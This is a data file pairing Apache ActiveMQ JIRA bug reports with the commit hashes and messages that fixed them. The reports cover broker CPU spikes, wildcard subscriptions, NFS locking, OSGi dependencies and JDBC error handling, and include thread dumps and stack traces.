701        
            //fix code
            if(this.content !=null && this.content.length >0){
                try{
                    this.dataOut.write(this.content.getData());
                }catch(IOException ioe){
                    throw JMSExceptionSupport.create(ioe);
                }
            }
702    }",8b06c44cc0028565b1de42bebad024f20fbc1a00,Added test to reproduce AMQ-4887
12679071,AMQ-4884,If you subscribe to a Wildcard Destination (e.g. a Topic) - with an name A.*.> then a message sent to a Destination A.B should match that Wildcard and be assigned to that Subscriber. This is not the case currently.,291ec5ea17817cb374c1a2342dd280ee986ebaa3,Fix for https://issues.apache.org/jira/browse/AMQ-4884
12677814,AMQ-4853,"After upgrading from AMQ 5.8 to 5.9 we have seen cpu usage continually climb until AMQ threads are taking nearly all of the CPU Resources while remaining fairly idle. This is just a single broker with advisory support on. (Advisory support is on in this case as we run the same config for a network of brokers.) Turning off advisory support reduced the CPU load to single digits.

top -H output:
Cpu(s): 97.8%us,  2.1%sy,  0.0%ni,  0.0%id,  0.0%wa,  0.0%hi,  0.1%si,  0.0%st
Mem:   7872040k total,  6574324k used,  1297716k free,   301028k buffers
Swap:        0k total,        0k used,        0k free,  1635392k cached

  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                                                                          
25476 root      16   0 2173m 891m  11m R 14.4 11.6  86:12.10 java                                                                                                                                              
25472 root      15   0 2173m 891m  11m R 13.6 11.6  86:09.77 java                                                                                                                                              
25155 root      16   0 2173m 891m  11m R  9.8 11.6  86:26.13 java                                                                                                                                              
25471 root      16   0 2173m 891m  11m R  9.2 11.6  86:12.93 java                                                                                                                                              
25514 root      16   0 2173m 891m  11m R  9.2 11.6  86:15.12 java                                                                                                                                              
25202 root      16   0 2173m 891m  11m R  8.7 11.6  86:33.20 java                                                                                                                                              
25189 root      16   0 2173m 891m  11m S  8.4 11.6  86:24.65 java                                                                                                                                              
25274 root      16   0 2173m 891m  11m R  8.1 11.6  86:18.45 java                                                                                                                                              
19272 root      15   0 2173m 891m  11m S  8.1 11.6   8:40.19 java                                                                                                                                              
20039 root      15   0 2173m 891m  11m S  8.1 11.6   8:15.53 java                                                                                                                                              
19270 root      15   0 2173m 891m  11m R  7.8 11.6   8:35.85 java                                                                                                                                              
25134 root      16   0 2173m 891m  11m R  7.5 11.6  90:42.29 java                                                                                                                                              
25259 root      15   0 2173m 891m  11m R  7.5 11.6  90:30.02 java                                                                                                                                              
25474 root      16   0 2173m 891m  11m R  7.5 11.6  86:13.24 java                                                                                                                                              
25475 root      16   0 2173m 891m  11m R  7.5 11.6  86:11.74 java                                                                                                                                              
25483 root      16   0 2173m 891m  11m R  7.5 11.6  86:12.30 java                                                                                                                                              
25210 root      15   0 2173m 891m  11m R  7.2 11.6  90:35.24 java                                                                                                                                              
25129 root      16   0 2173m 891m  11m S  6.9 11.6  90:31.27 java                                                                                                                                              
25249 root      16   0 2173m 891m  11m S  6.9 11.6  86:18.35 java                                                                                                                                              
25489 root      16   0 2173m 891m  11m R  6.9 11.6  86:16.93 java                                                                                                                                              
 9971 root      15   0 2173m 891m  11m S  6.6 11.6  38:53.66 java                                                                                                                                              
25116 root      16   0 2173m 891m  11m R  6.3 11.6  90:28.39 java                                                                                                                                              
25513 root      16   0 2173m 891m  11m R  6.3 11.6  86:07.62 java    


Thread dump snippets:

PID 25476 --
""ActiveMQ Transport: tcp:///10.33.154.95:48799@61616"" daemon prio=10 tid=0x00002aaaf5288800 nid=0x6384 runnable [0x00000000489b1000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)


PID - 25473
""ActiveMQ Transport: tcp:///10.33.154.95:48802@61616"" daemon prio=10 tid=0x00002aaaf6afc800 nid=0x6381 runnable [0x000000004779f000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)


PID 25471 --
""ActiveMQ Transport: tcp:///10.33.154.95:48803@61616"" daemon prio=10 tid=0x00002aaaf6f4b800 nid=0x6380 runnable [0x00000000487af000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)



",8f078a3f4ce0599f958c1363e55fbc966013cdba,"https://issues.apache.org/jira/browse/AMQ-4853

Add hashCode and equals override so that this object can be used in
collections properly"
12677814,AMQ-4853,"After upgrading from AMQ 5.8 to 5.9 we have seen cpu usage continually climb until AMQ threads are taking nearly all of the CPU Resources while remaining fairly idle. This is just a single broker with advisory support on. (Advisory support is on in this case as we run the same config for a network of brokers.) Turning off advisory support reduced the CPU load to single digits.

top -H output:
Cpu(s): 97.8%us,  2.1%sy,  0.0%ni,  0.0%id,  0.0%wa,  0.0%hi,  0.1%si,  0.0%st
Mem:   7872040k total,  6574324k used,  1297716k free,   301028k buffers
Swap:        0k total,        0k used,        0k free,  1635392k cached

  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                                                                          
25476 root      16   0 2173m 891m  11m R 14.4 11.6  86:12.10 java                                                                                                                                              
25472 root      15   0 2173m 891m  11m R 13.6 11.6  86:09.77 java                                                                                                                                              
25155 root      16   0 2173m 891m  11m R  9.8 11.6  86:26.13 java                                                                                                                                              
25471 root      16   0 2173m 891m  11m R  9.2 11.6  86:12.93 java                                                                                                                                              
25514 root      16   0 2173m 891m  11m R  9.2 11.6  86:15.12 java                                                                                                                                              
25202 root      16   0 2173m 891m  11m R  8.7 11.6  86:33.20 java                                                                                                                                              
25189 root      16   0 2173m 891m  11m S  8.4 11.6  86:24.65 java                                                                                                                                              
25274 root      16   0 2173m 891m  11m R  8.1 11.6  86:18.45 java                                                                                                                                              
19272 root      15   0 2173m 891m  11m S  8.1 11.6   8:40.19 java                                                                                                                                              
20039 root      15   0 2173m 891m  11m S  8.1 11.6   8:15.53 java                                                                                                                                              
19270 root      15   0 2173m 891m  11m R  7.8 11.6   8:35.85 java                                                                                                                                              
25134 root      16   0 2173m 891m  11m R  7.5 11.6  90:42.29 java                                                                                                                                              
25259 root      15   0 2173m 891m  11m R  7.5 11.6  90:30.02 java                                                                                                                                              
25474 root      16   0 2173m 891m  11m R  7.5 11.6  86:13.24 java                                                                                                                                              
25475 root      16   0 2173m 891m  11m R  7.5 11.6  86:11.74 java                                                                                                                                              
25483 root      16   0 2173m 891m  11m R  7.5 11.6  86:12.30 java                                                                                                                                              
25210 root      15   0 2173m 891m  11m R  7.2 11.6  90:35.24 java                                                                                                                                              
25129 root      16   0 2173m 891m  11m S  6.9 11.6  90:31.27 java                                                                                                                                              
25249 root      16   0 2173m 891m  11m S  6.9 11.6  86:18.35 java                                                                                                                                              
25489 root      16   0 2173m 891m  11m R  6.9 11.6  86:16.93 java                                                                                                                                              
 9971 root      15   0 2173m 891m  11m S  6.6 11.6  38:53.66 java                                                                                                                                              
25116 root      16   0 2173m 891m  11m R  6.3 11.6  90:28.39 java                                                                                                                                              
25513 root      16   0 2173m 891m  11m R  6.3 11.6  86:07.62 java    


Thread dump snippets:

PID 25476 --
""ActiveMQ Transport: tcp:///10.33.154.95:48799@61616"" daemon prio=10 tid=0x00002aaaf5288800 nid=0x6384 runnable [0x00000000489b1000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)


PID - 25473
""ActiveMQ Transport: tcp:///10.33.154.95:48802@61616"" daemon prio=10 tid=0x00002aaaf6afc800 nid=0x6381 runnable [0x000000004779f000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)


PID 25471 --
""ActiveMQ Transport: tcp:///10.33.154.95:48803@61616"" daemon prio=10 tid=0x00002aaaf6f4b800 nid=0x6380 runnable [0x00000000487af000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)



",6552287221c1706684fb2babe5d9777aabd09531,"https://issues.apache.org/jira/browse/AMQ-4853

adds a little test and preserves some performance tests if needed later."
12676688,AMQ-4840,a KEEPALIVE frame was being sent by ActiveMQ to stomp websocket clients that enabled heartbeats. ,f7311567a022dcdfb00126b4931a485a8afdb134,Fixes https://issues.apache.org/jira/browse/AMQ-4840 - Invalid STOMP frame sent on websocket connections with heartbeats.
12673400,AMQ-4798,"[10:58:42] <davsclaus>	 gtully on last amq from ASF i see this when starting the standalone broker
[10:58:43] <davsclaus>	 INFO | Usage(default:memory:topic://ActiveMQ.Advisory.MasterBroker:memory) limit=720332416 should be smaller than its parent limit=720332390
[10:58:54] <davsclaus>	 i guess its the recent 70% heap memory stuff
[10:59:11] <davsclaus>	 just wonder if everyone will see this, and if we can make the message more friendly?
[11:28:06] <rajdavies>	 davsclaus - why is the destination memory limit so high for an advisory ?
[11:29:23] <davsclaus>	 rajdavies not sure - gtully changed the default settings yesterday instead of fixed 64mb limit etc
[11:29:31] <davsclaus>	 it was 70% heap memory based instead
[11:30:03] <dejanb>	 rajdavies: and per destination limit is removed … so I guess we have some bug in there
[11:30:06] <davsclaus>	 http://git-wip-us.apache.org/repos/asf/activemq/commit/5bdcc196
[11:30:39] <rajdavies>	 davsclaus - ok - looks like a bug then",031611ed22cbb523a816a98ca6cdda0cd519759b,https://issues.apache.org/jira/browse/AMQ-4798 - reflect new 1g default so set expected value in test
12673400,AMQ-4798,"[10:58:42] <davsclaus>	 gtully on last amq from ASF i see this when starting the standalone broker
[10:58:43] <davsclaus>	 INFO | Usage(default:memory:topic://ActiveMQ.Advisory.MasterBroker:memory) limit=720332416 should be smaller than its parent limit=720332390
[10:58:54] <davsclaus>	 i guess its the recent 70% heap memory stuff
[10:59:11] <davsclaus>	 just wonder if everyone will see this, and if we can make the message more friendly?
[11:28:06] <rajdavies>	 davsclaus - why is the destination memory limit so high for an advisory ?
[11:29:23] <davsclaus>	 rajdavies not sure - gtully changed the default settings yesterday instead of fixed 64mb limit etc
[11:29:31] <davsclaus>	 it was 70% heap memory based instead
[11:30:03] <dejanb>	 rajdavies: and per destination limit is removed … so I guess we have some bug in there
[11:30:06] <davsclaus>	 http://git-wip-us.apache.org/repos/asf/activemq/commit/5bdcc196
[11:30:39] <rajdavies>	 davsclaus - ok - looks like a bug then",9815b9dc75b2fa7d5df40edc449db2bd15bae240,https://issues.apache.org/jira/browse/AMQ-4798 - reflect new 1g default so set expected value in test
12667996,AMQ-4719,"The JMS Spec states that connecting with a duplicate ClientID should throw an Exception. However, for MQTT and AMQP specs ""Link Stealing"" where the last ClientID pushes out the older connection with the same ClientID should be supported. ActiveMQ supports link stealing for connections with a duplicate ConnectionID - though the ConnectionID is not something supported by MQTT or AMQP. Make Link Stealing optional - so it can be set on by default for MQTT and AMQP TransportConnectors",47d198513915532e1e8a3bcb0f9a6f98f5a794dd,Fix for https://issues.apache.org/jira/browse/AMQ-4719
12667996,AMQ-4719,"The JMS Spec states that connecting with a duplicate ClientID should throw an Exception. However, for MQTT and AMQP specs ""Link Stealing"" where the last ClientID pushes out the older connection with the same ClientID should be supported. ActiveMQ supports link stealing for connections with a duplicate ConnectionID - though the ConnectionID is not something supported by MQTT or AMQP. Make Link Stealing optional - so it can be set on by default for MQTT and AMQP TransportConnectors",4183e6e47c29f6d34313a83cb748b4c137b8a353,Fix for https://issues.apache.org/jira/browse/AMQ-4719
12667810,AMQ-4717,"When setting the attribute populateJMSXUserID=""true"" as documented [1] the broker should populate the JMS message with the JMSXUserID property.  However, this is not the case.  

I have configured the broker to require authentication and sent a message to a Queue using the JMS producer shipped with the distribution.  The message is then inspected via JMX and the JMSXUserID property is not set.

[1] http://activemq.apache.org/jmsxuserid.html",9c75fe7b61f4b6aac639eb692c0989372ab07594,Fix for AMQ-4717: populateJMSXUserID is not setting the JMSXUserID property on the JMS message in JMX
12667810,AMQ-4717,"When setting the attribute populateJMSXUserID=""true"" as documented [1] the broker should populate the JMS message with the JMSXUserID property.  However, this is not the case.  

I have configured the broker to require authentication and sent a message to a Queue using the JMS producer shipped with the distribution.  The message is then inspected via JMX and the JMSXUserID property is not set.

[1] http://activemq.apache.org/jmsxuserid.html",fd67eefad63ec1676734fefa1037c1d12bdb35c4,Improve test for AMQ-4717: verify that propertyExists also works.
12666642,AMQ-4712,"Running org.apache.activemq.transport.mqtt.MQTTNioTest
Tests run: 19, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 160.808 sec <<< FAILURE!
Running org.apache.activemq.transport.mqtt.MQTTSSLTest
Tests run: 18, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 161.426 sec <<< FAILURE!
Running org.apache.activemq.transport.mqtt.MQTTTest
Tests run: 18, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 158.184 sec <<< FAILURE!

Results :

Tests in error:
  testPingOnMQTTNIO(org.apache.activemq.transport.mqtt.MQTTNioTest): The client id MUST be configured when clean session is set to false
  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTNioTest): String index out of range: -6
  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTSSLTest): Command from server contained an invalid message id: 1
  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTTest): Command from server contained an invalid message id: 1

Tests run: 55, Failures: 0, Errors: 4, Skipped: 0
",18e163de5e12fe8b88e5ce0b60cec461948573a5,Added @Ignore to testReceiveMessageSentWhileOffline as it was failing regularly on both.  See AMQ-4712
12666588,AMQ-4711,"When we remove a destination using JMX the appropriate parent statistics object is not properly updated, leading to wrong message count statistics.",a0c1781c4e909d35030d9762eaa70cf37639a569,https://issues.apache.org/jira/browse/AMQ-4711 - totalMessageCount stat is not decremented after destination removal
12666328,AMQ-4705,"issue on nsfv4 with a master slave configuration, where both the slave and the master could obtain a lock.
The following events occurred:

* master locks the file - does no more i/o to it – it's passive wrt the lock
* slave asks every 10 seconds if it can get the lock nfs come back and say no, someone has it
* nfs dies not nicely
 ** nfsv4 is stateful - no callback for locks. 
 ** It has a grace period of 30 seconds to let all clients that had locks reclaim them as locked
* master does not realize it needs to reclaim the lock and continues under the assumption it has the lock.
* After 30 sec grace period, slave comes in and asks for the lock and it receives it.",0525f88639b1a14686ed96a3507eccb238235144,https://issues.apache.org/jira/browse/AMQ-4705 - implement keepAlive with a delegation to channel lock isValid
12666328,AMQ-4705,"issue on nsfv4 with a master slave configuration, where both the slave and the master could obtain a lock.
The following events occurred:

* master locks the file - does no more i/o to it – it's passive wrt the lock
* slave asks every 10 seconds if it can get the lock nfs come back and say no, someone has it
* nfs dies not nicely
 ** nfsv4 is stateful - no callback for locks. 
 ** It has a grace period of 30 seconds to let all clients that had locks reclaim them as locked
* master does not realize it needs to reclaim the lock and continues under the assumption it has the lock.
* After 30 sec grace period, slave comes in and asks for the lock and it receives it.",181e4d461758acb9910615213db8d400277309d6,https://issues.apache.org/jira/browse/AMQ-4705 - ensure cached lastModified is externally visible - hardened test showed window for missed mod
12666176,AMQ-4702,"Getting the following on trunk when trying to install activemq-osgi:

Error when installing feature activemq: java.lang.Exception: Can not resolve feature:
Unsatisfied requirement(s):
---------------------------
package&(package=org.jvnet.jaxb2_commons.lang)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi
package&(package=org.jvnet.jaxb2_commons.locator)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi
package&(package=org.jvnet.jaxb2_commons.locator.util)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi",3d6065ea3ff2249b9e96ab1bb56ad3ceceaa91ca,AMQ-4702 - Error resolving org.jvnet.jaxb2_commons packages
12666176,AMQ-4702,"Getting the following on trunk when trying to install activemq-osgi:

Error when installing feature activemq: java.lang.Exception: Can not resolve feature:
Unsatisfied requirement(s):
---------------------------
package&(package=org.jvnet.jaxb2_commons.lang)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi
package&(package=org.jvnet.jaxb2_commons.locator)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi
package&(package=org.jvnet.jaxb2_commons.locator.util)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi",0203cde15029bd2df8ff0efc87c54b598ddac9b3,https://issues.apache.org/jira/browse/AMQ-4702 - added additional bundlel jaxb impl
12662394,AMQ-4672,<NA>,dd286e2381d163ef3a77833dcb5e7d0e36b42104,"Fixes AMQ-4672 - [JMS Client] Set the SNI field on SSL connections

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511335 13f79535-47bb-0310-9956-ffa450edef68"
12660127,AMQ-4656,"When using a durable topics the Pending Queue Counter provides an incorrect value for pending messages.

Steps to recreate

Set up the durable subscriber

{noformat}
ant consumer -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Ddurable=true -Dmax=2
{noformat}

Stop the subscriber

Send 20 persistent messages

{noformat}
ant producer -Ddurable=true -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Dmax=20
{noformat}

Consume 2 messages

{noformat}
ant consumer -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Ddurable=true -Dmax=2
{noformat}

View the counter stats.

The result is the following:

{noformat}
Pending Queue Size = 38
Dispatched Queue Size = 0
Dispatched Counter = 20
Enqueue Counter = 20
Dequeue Counter = 2
{noformat}
",ccde93a238b8882818d724c665787d547cc289e7,"https://issues.apache.org/jira/browse/AMQ-4656 - adding a test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511334 13f79535-47bb-0310-9956-ffa450edef68"
12660069,AMQ-4655,"We should run the JoramJmsTests using amqp+ssl.

I will attach a patch.
",4a270fe1f0bf78087e1f7ed342f30b80e06a1559,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4655

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1507346 13f79535-47bb-0310-9956-ffa450edef68"
12660069,AMQ-4655,"We should run the JoramJmsTests using amqp+ssl.

I will attach a patch.
",ddd4d9fff2c381e81bc44519777a37802b19df8d,"fix add missing file from https://issues.apache.org/jira/browse/AMQ-4655

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511780 13f79535-47bb-0310-9956-ffa450edef68"
12658747,AMQ-4643,"This related to AMQ-4636 JIRA for gtully's second point in comment https://issues.apache.org/jira/browse/AMQ-4636?focusedCommentId=13712196&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13712196

Scenario:
- Producer sending persistent message (no transaction)
- JDBCIOExceptionHandler is configured 
- the underlying DB is shutdown during message send

Result:
One of two outcomes can happen:
1) the broker sends the an IOException/SQLException wrapped in a JMSException (below) back to the client and then shuts down the transport connectors.
2) the broker shuts down the transport connector when the IOException/SQLException is encountered.

Expected behavior:
As the JDBCIOHandler is configured which is handling the SQL exception, it would be good if the transport connectors were shutdown and no IOException/SQLException is reported to producer.

{code}
2013-07-19 15:22:05,436 [main           ] - ERROR pDBDuringProducerSendTopicTest - unexpected exception caught
javax.jms.JMSException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1391)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1319)
	at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1809)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:289)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:224)
	at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)
	at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest.sendMessage(StopDBDuringProducerSendTopicTest.java:150)
	at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest.testProducerWithDBShutdown(StopDBDuringProducerSendTopicTest.java:127)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at junit.framework.TestCase.runTest(TestCase.java:176)
	at junit.framework.TestCase.runBare(TestCase.java:141)
	at junit.framework.TestResult$1.protect(TestResult.java:122)
	at junit.framework.TestResult.runProtected(TestResult.java:142)
	at junit.framework.TestResult.run(TestResult.java:125)
	at junit.framework.TestCase.run(TestCase.java:129)
	at junit.framework.TestSuite.runTest(TestSuite.java:255)
	at junit.framework.TestSuite.run(TestSuite.java:250)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
	at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164)
	at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110)
	at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175)
	at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
Caused by: java.io.IOException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45)
	at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:68)
	at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doAddMessage(DefaultJDBCAdapter.java:218)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:123)
	at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:327)
	at org.apache.activemq.store.memory.MemoryTransactionStore$2.asyncAddTopicMessage(MemoryTransactionStore.java:190)
	at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:482)
